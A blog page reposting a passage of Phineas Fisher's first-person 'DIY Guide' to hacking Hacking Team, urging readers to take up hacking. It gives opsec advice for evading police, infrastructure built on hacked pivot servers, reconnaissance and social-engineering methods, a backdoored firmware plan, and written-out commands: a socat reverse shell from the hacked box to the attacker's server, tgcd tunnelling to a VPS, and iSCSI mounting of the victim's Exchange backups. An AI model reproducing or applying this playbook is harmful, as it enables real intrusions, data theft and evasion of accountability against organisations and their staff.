<!doctype html>
<html class="theme-next use-motion theme-next-mist">
<head>
  

<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>






  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>


<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>


    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />



  <meta name="keywords" content="渗透测试," />





  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: 'Mist',
    analytics: {
      google: ''
    },
    sidebar: 'post'
  };
</script>


  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>



  <title> Phineas Fisher 渗透 Hacking Team， 过程与思路 // Neurohazard </title>
</head>

<body>
  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->

  <div class="container one-column page-post-detail">
    <div class="headband"></div>

    <div id="header" class="header">
      <div class="header-inner">
        <h1 class="site-meta">
  <span class="logo-line-before"><i></i></span>
  <a href="/" class="brand">
      <span class="logo">
        <i class="icon-logo"></i>
      </span>
      <span class="site-title">Neurohazard</span>
  </a>
  <span class="logo-line-after"><i></i></span>
</h1>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<div class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/">
            <i class="menu-item-icon icon-home"></i> <br />
            首頁
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about">
            <i class="menu-item-icon icon-about"></i> <br />
            關於
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives">
            <i class="menu-item-icon icon-archives"></i> <br />
            歸檔
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags">
            <i class="menu-item-icon icon-tags"></i> <br />
            標籤
          </a>
        </li>
      
        
        <li class="menu-item menu-item-friend">
          <a href="/friend">
            <i class="menu-item-icon icon-friend"></i> <br />
            友情鏈接
          </a>
        </li>
      
        
        <li class="menu-item menu-item-reading-list">
          <a href="/reading-list">
            <i class="menu-item-icon icon-reading-list"></i> <br />
            閱讀清單
          </a>
        </li>
      
    </ul>
  

  
</div>


      </div>
    </div>

    <div id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          

  <div id="posts" class="posts-expand">
    

  <div class="post post-type-normal ">
    <div class="post-header">

      
      
        <h1 class="post-title">
          
          
            
              Phineas Fisher 渗透 Hacking Team， 过程与思路
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          發表於 2017-03-03
        </span>

        
          <span class="post-category">
            &nbsp; | &nbsp; 分類於
            
              <a href="/categories/信息安全/">信息安全</a>

              
              

            
          </span>
        

        
          
            <span class="post-comments-count">
            &nbsp; | &nbsp;
            <a href="/2017/03/03/pentesting-hacking-team/#comments" >
              <span class="post-comments-count ds-thread-count" data-thread-key="2017/03/03/pentesting-hacking-team/"></span>
            </a>
          </span>
          
        
      </div>
    </div>

    <div class="post-body">

      
      

      
        <h1 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h1><p>相关参考资料<br>FinFisher hacked<br><a href="http://pastebin.com/raw/cRYvK4jb" target="_blank" rel="external">http://pastebin.com/raw/cRYvK4jb</a></p>
<p>Gamma Hacked<br><a href="http://www.freebuf.com/articles/web/41809.html" target="_blank" rel="external">我是如何黑掉英国间谍软件公司Gamma的</a></p>
<p>黑客讲述渗透Hacking Team全过程（详细解说）<br><a href="http://www.freebuf.com/articles/102500.html" target="_blank" rel="external">http://www.freebuf.com/articles/102500.html</a></p>
<h1 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h1><p><a href="http://pastebin.com/0SNSvyjJ" target="_blank" rel="external">http://pastebin.com/0SNSvyjJ</a></p>
<hr>
<p>| | | | <strong> <em>  </em></strong>| | <strong> | </strong> )  <strong> <em>  </em></strong>| | <em>| |<br>| |</em>| |/ <em>` |/ __| |/ / |  </em> \ / <em>` |/ __| |/ / |<br>|  </em>  | (<em>| | (__|   &lt;  | |</em>) | (<em>| | (__|   &lt;|</em>|<br>|<em>| |</em>|_<em>,</em>|_<strong>|<em>|\</em>\ |__</strong>/ _<em>,</em>|__<em>|</em>|_(_)</p>
<pre><code>              A DIY Guide



             ,-._,-._             
          _,-\  o O_/;            
         / ,  `     `|            
         | \-.,___,  /   `        
          \ `-.__/  /    ,.\      
         / `-.__.-\`   ./   \&apos;
        / /|    ___\ ,/      `\
       ( ( |.-&quot;`   &apos;/\         \  `
        \ \/      ,,  |          \ _
         \|     o/o   /           \.
          \        , /             /
          ( __`;-;&apos;__`)            \\
          `//&apos;`   `||`              `\
         _//       ||           __   _   _ _____   __
 .-&quot;-._,(__)     .(__).-&quot;&quot;-.      | | | | |_   _| |
/          \    /           \     | | |_| | | |   |
\          /    \           /     | |  _  | | |   |
 `&apos;-------`      `--------&apos;`    __| |_| |_| |_|   |__
           #antisec
</code></pre><p>–[ 1 - Introduction ]———————————————————-</p>
<p>You’ll notice the change in language since the last edition [1]. The<br>English-speaking world already has tons of books, talks, guides, and<br>info about hacking. In that world, there’s plenty of hackers better than me,<br>but they misuse their talents working for “defense” contractors, for intelligence<br>agencies, to protect banks and corporations, and to defend the status quo.<br>Hacker culture was born in the US as a counterculture, but that origin only<br>remains in its aesthetics - the rest has been assimilated. At least they can<br>wear a t-shirt, dye their hair blue, use their hacker names, and feel like<br>rebels while they work for the Man.</p>
<p>You used to have to sneak into offices to leak documents [2]. You used to need<br>a gun to rob a bank. Now you can do both from bed with a laptop in hand [3][4].<br>Like the CNT said after the Gamma Group hack: “Let’s take a step forward with<br>new forms of struggle” [5]. Hacking is a powerful tool, let’s learn and fight!</p>
<p>[1] <a href="http://pastebin.com/raw.php?i=cRYvK4jb" target="_blank" rel="external">http://pastebin.com/raw.php?i=cRYvK4jb</a><br>[2] <a href="https://en.wikipedia.org/wiki/Citizens%27_Commission_to_Investigate_the_FBI" target="_blank" rel="external">https://en.wikipedia.org/wiki/Citizens%27_Commission_to_Investigate_the_FBI</a><br>[3] <a href="http://www.aljazeera.com/news/2015/09/algerian-hacker-hero-hoodlum-150921083914167.html" target="_blank" rel="external">http://www.aljazeera.com/news/2015/09/algerian-hacker-hero-hoodlum-150921083914167.html</a><br>[4] <a href="https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf" target="_blank" rel="external">https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf</a><br>[5] <a href="http://madrid.cnt.es/noticia/consideraciones-sobre-el-ataque-informatico-a-gamma-group" target="_blank" rel="external">http://madrid.cnt.es/noticia/consideraciones-sobre-el-ataque-informatico-a-gamma-group</a></p>
<p>–[ 2 - Hacking Team ]———————————————————-</p>
<p>Hacking Team was a company that helped governments hack and spy on<br>journalists, activists, political opposition, and other threats to their power<br>[1][2][3][4][5][6][7][8][9][10][11]. And, occasionally, on actual criminals<br>and terrorists [12]. Vincenzetti, the CEO, liked to end his emails with the<br>fascist slogan “boia chi molla”. It’d be more correct to say “boia chi vende<br>RCS”. They also claimed to have technology to solve the “problem” posed by Tor<br>and the darknet [13]. But seeing as I’m still free, I have my doubts about<br>its effectiveness.</p>
<p>[1] <a href="http://www.animalpolitico.com/2015/07/el-gobierno-de-puebla-uso-el-software-de-hacking-team-para-espionaje-politico/" target="_blank" rel="external">http://www.animalpolitico.com/2015/07/el-gobierno-de-puebla-uso-el-software-de-hacking-team-para-espionaje-politico/</a><br>[2] <a href="http://www.prensa.com/politica/claves-entender-Hacking-Team-Panama_0_4251324994.html" target="_blank" rel="external">http://www.prensa.com/politica/claves-entender-Hacking-Team-Panama_0_4251324994.html</a><br>[3] <a href="http://www.24-horas.mx/ecuador-espio-con-hacking-team-a-opositor-carlos-figueroa/" target="_blank" rel="external">http://www.24-horas.mx/ecuador-espio-con-hacking-team-a-opositor-carlos-figueroa/</a><br>[4] <a href="https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/" target="_blank" rel="external">https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/</a><br>[5] <a href="https://citizenlab.org/2014/02/hacking-team-targeting-ethiopian-journalists/" target="_blank" rel="external">https://citizenlab.org/2014/02/hacking-team-targeting-ethiopian-journalists/</a><br>[6] <a href="https://citizenlab.org/2015/03/hacking-team-reloaded-us-based-ethiopian-journalists-targeted-spyware/" target="_blank" rel="external">https://citizenlab.org/2015/03/hacking-team-reloaded-us-based-ethiopian-journalists-targeted-spyware/</a><br>[7] <a href="http://focusecuador.net/2015/07/08/hacking-team-rodas-paez-tiban-torres-son-espiados-en-ecuador/" target="_blank" rel="external">http://focusecuador.net/2015/07/08/hacking-team-rodas-paez-tiban-torres-son-espiados-en-ecuador/</a><br>[8] <a href="http://www.pri.org/stories/2015-07-08/these-ethiopian-journalists-exile-hacking-team-revelations-are-personal" target="_blank" rel="external">http://www.pri.org/stories/2015-07-08/these-ethiopian-journalists-exile-hacking-team-revelations-are-personal</a><br>[9] <a href="https://theintercept.com/2015/07/07/leaked-documents-confirm-hacking-team-sells-spyware-repressive-countries/" target="_blank" rel="external">https://theintercept.com/2015/07/07/leaked-documents-confirm-hacking-team-sells-spyware-repressive-countries/</a><br>[10] <a href="http://www.wired.com/2013/06/spy-tool-sold-to-governments/" target="_blank" rel="external">http://www.wired.com/2013/06/spy-tool-sold-to-governments/</a><br>[11] <a href="http://www.theregister.co.uk/2015/07/13/hacking_team_vietnam_apt/" target="_blank" rel="external">http://www.theregister.co.uk/2015/07/13/hacking_team_vietnam_apt/</a><br>[12] <a href="http://www.ilmessaggero.it/primopiano/cronaca/yara_bossetti_hacking_team-1588888.html" target="_blank" rel="external">http://www.ilmessaggero.it/primopiano/cronaca/yara_bossetti_hacking_team-1588888.html</a><br>[13] <a href="http://motherboard.vice.com/en_ca/read/hacking-team-founder-hey-fbi-we-can-help-you-crack-the-dark-web" target="_blank" rel="external">http://motherboard.vice.com/en_ca/read/hacking-team-founder-hey-fbi-we-can-help-you-crack-the-dark-web</a></p>
<p>–[ 3 - Stay safe out there ]—————————————————</p>
<p>Unfortunately, our world is backwards. You get rich by doing bad things and go<br>to jail for doing good. Fortunately, thanks to the hard work of people like<br>the Tor project [1], you can avoid going to jail by taking a few simple<br>precautions:</p>
<p>1) Encrypt your hard disk [2]</p>
<p>I guess when the police arrive to seize your computer, it means you’ve<br>already made a lot of mistakes, but it’s better to be safe.</p>
<p>2) Use a virtual machine with all traffic routed through Tor</p>
<p>This accomplishes two things. First, all your traffic is anonymized through<br>Tor. Second, keeping your personal life and your hacking on separate<br>computers helps you not to mix them by accident.</p>
<p>You can use projects like Whonix [3], Tails [4], Qubes TorVM [5], or<br>something custom [6]. Here’s [7] a detailed comparison.</p>
<p>3) (Optional) Don’t connect directly to Tor</p>
<p>Tor isn’t a panacea. They can correlate the times you’re connected to Tor<br>with the times your hacker handle is active. Also, there have been<br>successful attacks against Tor [8]. You can connect to Tor using other<br>peoples’ wifi. Wifislax [9] is a linux distro with a lot of tools for<br>cracking wifi. Another option is to connect to a VPN or a bridge node [10]<br>before Tor, but that’s less secure because they can still correlate the<br>hacker’s activity with your house’s internet activity (this was used as<br>evidence against Jeremy Hammond [11]).</p>
<p>The reality is that while Tor isn’t perfect, it works quite well. When I<br>was young and reckless, I did plenty of stuff without any protection (I’m<br>referring to hacking) apart from Tor, that the police tried their hardest<br>to investigate, and I’ve never had any problems.</p>
<p>[1] <a href="https://www.torproject.org/" target="_blank" rel="external">https://www.torproject.org/</a><br>[2] <a href="https://info.securityinabox.org/es/chapter-4" target="_blank" rel="external">https://info.securityinabox.org/es/chapter-4</a><br>[3] <a href="https://www.whonix.org/" target="_blank" rel="external">https://www.whonix.org/</a><br>[4] <a href="https://tails.boum.org/" target="_blank" rel="external">https://tails.boum.org/</a><br>[5] <a href="https://www.qubes-os.org/doc/privacy/torvm/" target="_blank" rel="external">https://www.qubes-os.org/doc/privacy/torvm/</a><br>[6] <a href="https://trac.torproject.org/projects/tor/wiki/doc/TransparentProxy" target="_blank" rel="external">https://trac.torproject.org/projects/tor/wiki/doc/TransparentProxy</a><br>[7] <a href="https://www.whonix.org/wiki/Comparison_with_Others" target="_blank" rel="external">https://www.whonix.org/wiki/Comparison_with_Others</a><br>[8] <a href="https://blog.torproject.org/blog/tor-security-advisory-relay-early-traffic-confirmation-attack/" target="_blank" rel="external">https://blog.torproject.org/blog/tor-security-advisory-relay-early-traffic-confirmation-attack/</a><br>[9] <a href="http://www.wifislax.com/" target="_blank" rel="external">http://www.wifislax.com/</a><br>[10] <a href="https://www.torproject.org/docs/bridges.html.en" target="_blank" rel="external">https://www.torproject.org/docs/bridges.html.en</a><br>[11] <a href="http://www.documentcloud.org/documents/1342115-timeline-correlation-jeremy-hammond-and-anarchaos.html" target="_blank" rel="external">http://www.documentcloud.org/documents/1342115-timeline-correlation-jeremy-hammond-and-anarchaos.html</a></p>
<p>—-[ 3.1 - Infrastructure ]—————————————————-</p>
<p>I don’t hack directly from Tor exit nodes. They’re on blacklists, they’re<br>slow, and they can’t receive connect-backs. Tor protects my anonymity while I<br>connect to the infrastructure I use to hack, which consists of:</p>
<p>1) Domain Names</p>
<p>For C&amp;C addresses, and for DNS tunnels for guaranteed egress.</p>
<p>2) Stable Servers</p>
<p>For use as C&amp;C servers, to receive connect-back shells, to launch attacks,<br>and to store the loot.</p>
<p>3) Hacked Servers</p>
<p>For use as pivots to hide the IP addresses of the stable servers. And for<br>when I want a fast connection without pivoting, for example to scan ports,<br>scan the whole internet, download a database with sqli, etc.</p>
<p>Obviously, you have to use an anonymous payment method, like bitcoin (if it’s<br>used carefully).</p>
<p>—-[ 3.2 - Attribution ]——————————————————-</p>
<p>In the news we often see attacks traced back to government-backed hacking<br>groups (“APTs”), because they repeatedly use the same tools, leave the same<br>footprints, and even use the same infrastructure (domains, emails, etc).<br>They’re negligent because they can hack without legal consequences.</p>
<p>I didn’t want to make the police’s work any easier by relating my hack of<br>Hacking Team with other hacks I’ve done or with names I use in my day-to-day<br>work as a blackhat hacker. So, I used new servers and domain names, registered<br>with new emails, and payed for with new bitcoin addresses. Also, I only used<br>tools that are publicly available, or things that I wrote specifically for<br>this attack, and I changed my way of doing some things to not leave my usual<br>forensic footprint.</p>
<p>–[ 4 - Information Gathering ]————————————————-</p>
<p>Although it can be tedious, this stage is very important, since the larger the<br>attack surface, the easier it is to find a hole somewhere in it.</p>
<p>—-[ 4.1 - Technical Information ]———————————————</p>
<p>Some tools and techniques are:</p>
<p>1) Google</p>
<p>A lot of interesting things can be found with a few well-chosen search<br>queries. For example, the identity of DPR [1]. The bible of Google hacking<br>is the book “Google Hacking for Penetration Testers”. You can find a short<br>summary in Spanish at [2].</p>
<p>2) Subdomain Enumeration</p>
<p>Often, a company’s main website is hosted by a third party, and you’ll find<br>the company’s actual IP range thanks to subdomains like mx.company.com or<br>ns1.company.com. Also, sometimes there are things that shouldn’t be exposed<br>in “hidden” subdomains. Useful tools for discovering domains and subdomains<br>are fierce [3], theHarvester [4], and recon-ng [5].</p>
<p>3) Whois lookups and reverse lookups</p>
<p>With a reverse lookup using the whois information from a domain or IP range<br>of a company, you can find other domains and IP ranges. As far as I know,<br>there’s no free way to do reverse lookups aside from a google “hack”:</p>
<p>“via della moscova 13” site:www.findip-address.com<br>“via della moscova 13” site:domaintools.com</p>
<p>4) Port scanning and fingerprinting</p>
<p>Unlike the other techniques, this talks to the company’s servers. I<br>include it in this section because it’s not an attack, it’s just<br>information gathering. The company’s IDS might generate an alert, but you<br>don’t have to worry since the whole internet is being scanned constantly.</p>
<p>For scanning, nmap [6] is precise, and can fingerprint the majority of<br>services discovered. For companies with very large IP ranges, zmap [7] or<br>masscan [8] are fast. WhatWeb [9] or BlindElephant [10] can fingerprint web<br>sites.</p>
<p>[1] <a href="http://www.nytimes.com/2015/12/27/business/dealbook/the-unsung-tax-agent-who-put-a-face-on-the-silk-road.html" target="_blank" rel="external">http://www.nytimes.com/2015/12/27/business/dealbook/the-unsung-tax-agent-who-put-a-face-on-the-silk-road.html</a><br>[2] <a href="http://web.archive.org/web/20140610083726/http://www.soulblack.com.ar/repo/papers/hackeando_con_google.pdf" target="_blank" rel="external">http://web.archive.org/web/20140610083726/http://www.soulblack.com.ar/repo/papers/hackeando_con_google.pdf</a><br>[3] <a href="http://ha.ckers.org/fierce/" target="_blank" rel="external">http://ha.ckers.org/fierce/</a><br>[4] <a href="https://github.com/laramies/theHarvester" target="_blank" rel="external">https://github.com/laramies/theHarvester</a><br>[5] <a href="https://bitbucket.org/LaNMaSteR53/recon-ng" target="_blank" rel="external">https://bitbucket.org/LaNMaSteR53/recon-ng</a><br>[6] <a href="https://nmap.org/" target="_blank" rel="external">https://nmap.org/</a><br>[7] <a href="https://zmap.io/" target="_blank" rel="external">https://zmap.io/</a><br>[8] <a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">https://github.com/robertdavidgraham/masscan</a><br>[9] <a href="http://www.morningstarsecurity.com/research/whatweb" target="_blank" rel="external">http://www.morningstarsecurity.com/research/whatweb</a><br>[10] <a href="http://blindelephant.sourceforge.net/" target="_blank" rel="external">http://blindelephant.sourceforge.net/</a></p>
<p>—-[ 4.2 - Social Information ]————————————————</p>
<p>For social engineering, it’s useful to have information about the employees,<br>their roles, contact information, operating system, browser, plugins,<br>software, etc. Some resources are:</p>
<p>1) Google</p>
<p>Here as well, it’s the most useful tool.</p>
<p>2) theHarvester and recon-ng</p>
<p>I already mentioned them in the previous section, but they have a lot more<br>functionality. They can find a lot of information quickly and<br>automatically. It’s worth reading all their documentation.</p>
<p>3) LinkedIn</p>
<p>A lot of information about the employees can be found here. The company’s<br>recruiters are the most likely to accept your connection requests.</p>
<p>4) Data.com</p>
<p>Previously known as jigsaw. They have contact information for many<br>employees.</p>
<p>5) File Metadata</p>
<p>A lot of information about employees and their systems can be found in<br>metadata of files the company has published. Useful tools for finding<br>files on the company’s website and extracting the metadata are metagoofil<br>[1] and FOCA [2].</p>
<p>[1] <a href="https://github.com/laramies/metagoofil" target="_blank" rel="external">https://github.com/laramies/metagoofil</a><br>[2] <a href="https://www.elevenpaths.com/es/labstools/foca-2/index.html" target="_blank" rel="external">https://www.elevenpaths.com/es/labstools/foca-2/index.html</a></p>
<p>–[ 5 - Entering the network ]————————————————–</p>
<p>There are various ways to get a foothold. Since the method I used against<br>Hacking Team is uncommon and a lot more work than is usually necessary, I’ll<br>talk a little about the two most common ways, which I recommend trying first.</p>
<p>—-[ 5.1 - Social Engineering ]————————————————</p>
<p>Social engineering, specifically spear phishing, is responsible for the<br>majority of hacks these days. For an introduction in Spanish, see [1]. For<br>more information in English, see [2] (the third part, “Targeted Attacks”). For<br>fun stories about the social engineering exploits of past generations, see<br>[3]. I didn’t want to try to spear phish Hacking Team, as their whole business<br>is helping governments spear phish their opponents, so they’d be much more<br>likely to recognize and investigate a spear phishing attempt.</p>
<p>[1] <a href="http://www.hacknbytes.com/2016/01/apt-pentest-con-empire.html" target="_blank" rel="external">http://www.hacknbytes.com/2016/01/apt-pentest-con-empire.html</a><br>[2] <a href="http://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/" target="_blank" rel="external">http://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/</a><br>[3] <a href="http://www.netcomunity.com/lestertheteacher/doc/ingsocial1.pdf" target="_blank" rel="external">http://www.netcomunity.com/lestertheteacher/doc/ingsocial1.pdf</a></p>
<p>—-[ 5.2 - Buying Access ]—————————————————–</p>
<p>Thanks to hardworking Russians and their exploit kits, traffic sellers, and<br>bot herders, many companies already have compromised computers in their<br>networks. Almost all of the Fortune 500, with their huge networks, have some<br>bots already inside. However, Hacking Team is a very small company, and most<br>of it’s employees are infosec experts, so there was a low chance that they’d<br>already been compromised.</p>
<p>—-[ 5.3 - Technical Exploitation ]——————————————–</p>
<p>After the Gamma Group hack, I described a process for searching for<br>vulnerabilities [1]. Hacking Team had one public IP range:<br>inetnum:        93.62.139.32 - 93.62.139.47<br>descr:          HT public subnet</p>
<p>Hacking Team had very little exposed to the internet. For example, unlike<br>Gamma Group, their customer support site needed a client certificate to<br>connect. What they had was their main website (a Joomla blog in which Joomscan<br>[2] didn’t find anything serious), a mail server, a couple routers, two VPN<br>appliances, and a spam filtering appliance. So, I had three options: look for<br>a 0day in Joomla, look for a 0day in postfix, or look for a 0day in one of the<br>embedded devices. A 0day in an embedded device seemed like the easiest option,<br>and after two weeks of work reverse engineering, I got a remote root exploit.<br>Since the vulnerabilities still haven’t been patched, I won’t give more<br>details, but for more information on finding these kinds of vulnerabilities,<br>see [3] and [4].</p>
<p>[1] <a href="http://pastebin.com/raw.php?i=cRYvK4jb" target="_blank" rel="external">http://pastebin.com/raw.php?i=cRYvK4jb</a><br>[2] <a href="http://sourceforge.net/projects/joomscan/" target="_blank" rel="external">http://sourceforge.net/projects/joomscan/</a><br>[3] <a href="http://www.devttys0.com/" target="_blank" rel="external">http://www.devttys0.com/</a><br>[4] <a href="https://docs.google.com/presentation/d/1-mtBSka1ktdh8RHxo2Ft0oNNlIp7WmDA2z9zzHpon8A" target="_blank" rel="external">https://docs.google.com/presentation/d/1-mtBSka1ktdh8RHxo2Ft0oNNlIp7WmDA2z9zzHpon8A</a></p>
<p>–[ 6 - Be Prepared ]———————————————————–</p>
<p>I did a lot of work and testing before using the exploit against Hacking Team.<br>I wrote a backdoored firmware, and compiled various post-exploitation tools<br>for the embedded device. The backdoor serves to protect the exploit. Using the<br>exploit just once and then returning through the backdoor makes it harder to<br>identify and patch the vulnerabilities.</p>
<p>The post-exploitation tools that I’d prepared were:</p>
<p>1) busybox</p>
<p>For all the standard Unix utilities that the system didn’t have.</p>
<p>2) nmap</p>
<p>To scan and fingerprint Hacking Team’s internal network.</p>
<p>3) Responder.py</p>
<p>The most useful tool for attacking windows networks when you have access to<br>the internal network, but no domain user.</p>
<p>4) Python</p>
<p>To execute Responder.py</p>
<p>5) tcpdump</p>
<p>For sniffing traffic.</p>
<p>6) dsniff</p>
<p>For sniffing passwords from plaintext protocols like ftp, and for<br>arpspoofing. I wanted to use ettercap, written by Hacking Team’s own ALoR<br>and NaGA, but it was hard to compile it for the system.</p>
<p>7) socat</p>
<p>For a comfortable shell with a pty:<br>my_server: socat file:<code>tty</code>,raw,echo=0 tcp-listen:my_port<br>hacked box: socat exec:’bash -li’,pty,stderr,setsid,sigint,sane \<br>tcp:my_server:my_port</p>
<p>And useful for a lot more, it’s a networking swiss army knife. See the<br>examples section of its documentation.</p>
<p>8) screen</p>
<p>Like the shell with pty, it wasn’t really necessary, but I wanted to feel<br>at home in Hacking Team’s network.</p>
<p>9) a SOCKS proxy server</p>
<p>To use with proxychains to be able to access their local network from any<br>program.</p>
<p>10) tgcd</p>
<p>For forwarding ports, like for the SOCKS server, through the firewall.</p>
<p>[1] <a href="https://www.busybox.net/" target="_blank" rel="external">https://www.busybox.net/</a><br>[2] <a href="https://nmap.org/" target="_blank" rel="external">https://nmap.org/</a><br>[3] <a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="external">https://github.com/SpiderLabs/Responder</a><br>[4] <a href="https://github.com/bendmorris/static-python" target="_blank" rel="external">https://github.com/bendmorris/static-python</a><br>[5] <a href="http://www.tcpdump.org/" target="_blank" rel="external">http://www.tcpdump.org/</a><br>[6] <a href="http://www.monkey.org/~dugsong/dsniff/" target="_blank" rel="external">http://www.monkey.org/~dugsong/dsniff/</a><br>[7] <a href="http://www.dest-unreach.org/socat/" target="_blank" rel="external">http://www.dest-unreach.org/socat/</a><br>[8] <a href="https://www.gnu.org/software/screen/" target="_blank" rel="external">https://www.gnu.org/software/screen/</a><br>[9] <a href="http://average-coder.blogspot.com/2011/09/simple-socks5-server-in-c.html" target="_blank" rel="external">http://average-coder.blogspot.com/2011/09/simple-socks5-server-in-c.html</a><br>[10] <a href="http://tgcd.sourceforge.net/" target="_blank" rel="external">http://tgcd.sourceforge.net/</a></p>
<p>The worst thing that could happen would be for my backdoor or post-exploitation<br>tools to make the system unstable and cause an employee to investigate. So I<br>spent a week testing my exploit, backdoor, and post-exploitation tools in the<br>networks of other vulnerable companies before entering Hacking Team’s network.</p>
<p>–[ 7 - Watch and Listen ]——————————————————</p>
<p>Now inside their internal network, I wanted to take a look around and think<br>about my next step. I started Responder.py in analysis mode (-A to listen<br>without sending poisoned responses), and did a slow scan with nmap.</p>
<p>–[ 8 - NoSQL Databases ]——————————————————-</p>
<p>NoSQL, or rather NoAuthentication, has been a huge gift to the hacker<br>community [1]. Just when I was worried that they’d finally patched all of the<br>authentication bypass bugs in MySQL [2][3][4][5], new databases came into<br>style that lack authentication by design. Nmap found a few in Hacking Team’s<br>internal network:</p>
<p>27017/tcp open  mongodb       MongoDB 2.6.5<br>| mongodb-databases:<br>|   ok = 1<br>|   totalSizeMb = 47547<br>|   totalSize = 49856643072<br>…<br>|_    version = 2.6.5</p>
<p>27017/tcp open  mongodb       MongoDB 2.6.5<br>| mongodb-databases:<br>|   ok = 1<br>|   totalSizeMb = 31987<br>|   totalSize = 33540800512<br>|   databases<br>…<br>|_    version = 2.6.5</p>
<p>They were the databases for test instances of RCS. The audio that RCS records<br>is stored in MongoDB with GridFS. The audio folder in the torrent [6] came<br>from this. They were spying on themselves without meaning to.</p>
<p>[1] <a href="https://www.shodan.io/search?query=product%3Amongodb" target="_blank" rel="external">https://www.shodan.io/search?query=product%3Amongodb</a><br>[2] <a href="https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql" target="_blank" rel="external">https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql</a><br>[3] <a href="http://archives.neohapsis.com/archives/vulnwatch/2004-q3/0001.html" target="_blank" rel="external">http://archives.neohapsis.com/archives/vulnwatch/2004-q3/0001.html</a><br>[4] <a href="http://downloads.securityfocus.com/vulnerabilities/exploits/hoagie_mysql.c" target="_blank" rel="external">http://downloads.securityfocus.com/vulnerabilities/exploits/hoagie_mysql.c</a><br>[5] <a href="http://archives.neohapsis.com/archives/bugtraq/2000-02/0053.html" target="_blank" rel="external">http://archives.neohapsis.com/archives/bugtraq/2000-02/0053.html</a><br>[6] <a href="https://ht.transparencytoolkit.org/audio/" target="_blank" rel="external">https://ht.transparencytoolkit.org/audio/</a></p>
<p>–[ 9 - Crossed Cables ]——————————————————–</p>
<p>Although it was fun to listen to recordings and see webcam images of Hacking<br>Team developing their malware, it wasn’t very useful. Their insecure backups<br>were the vulnerability that opened their doors. According to their<br>documentation [1], their iSCSI devices were supposed to be on a separate<br>network, but nmap found a few in their subnetwork 192.168.1.200/24:</p>
<p>Nmap scan report for ht-synology.hackingteam.local (192.168.200.66)<br>…<br>3260/tcp open  iscsi?<br>| iscsi-info:<br>|   Target: iqn.2000-01.com.synology:ht-synology.name<br>|     Address: 192.168.200.66:3260,0<br>|_    Authentication: No authentication required</p>
<p>Nmap scan report for synology-backup.hackingteam.local (192.168.200.72)<br>…<br>3260/tcp open  iscsi?<br>| iscsi-info:<br>|   Target: iqn.2000-01.com.synology:synology-backup.name<br>|     Address: 10.0.1.72:3260,0<br>|     Address: 192.168.200.72:3260,0<br>|_    Authentication: No authentication required</p>
<p>iSCSI needs a kernel module, and it would’ve been difficult to compile it for<br>the embedded system. I forwarded the port so that I could mount it from a VPS:</p>
<p>VPS: tgcd -L -p 3260 -q 42838<br>Embedded system: tgcd -C -s 192.168.200.72:3260 -c VPS_IP:42838</p>
<p>VPS: iscsiadm -m discovery -t sendtargets -p 127.0.0.1</p>
<p>Now iSCSI finds the name iqn.2000-01.com.synology but has problems mounting it<br>because it thinks its IP is 192.168.200.72 instead of 127.0.0.1</p>
<p>The way I solved it was:<br>iptables -t nat -A OUTPUT -d 192.168.200.72 -j DNAT –to-destination 127.0.0.1</p>
<p>And now, after:<br>iscsiadm -m node –targetname=iqn.2000-01.com.synology:synology-backup.name -p 192.168.200.72 –login</p>
<p>…the device file appears! We mount it:<br>vmfs-fuse -o ro /dev/sdb1 /mnt/tmp</p>
<p>and find backups of various virtual machines. The Exchange server seemed like<br>the most interesting. It was too big too download, but it was possible to<br>mount it remotely to look for interesting files:<br>$ losetup /dev/loop0 Exchange.hackingteam.com-flat.vmdk<br>$ fdisk -l /dev/loop0<br>/dev/loop0p1            2048  1258287103   629142528    7  HPFS/NTFS/exFAT</p>
<p>so the offset is 2048 * 512 = 1048576<br>$ losetup -o 1048576 /dev/loop1 /dev/loop0<br>$ mount -o ro /dev/loop1 /mnt/exchange/</p>
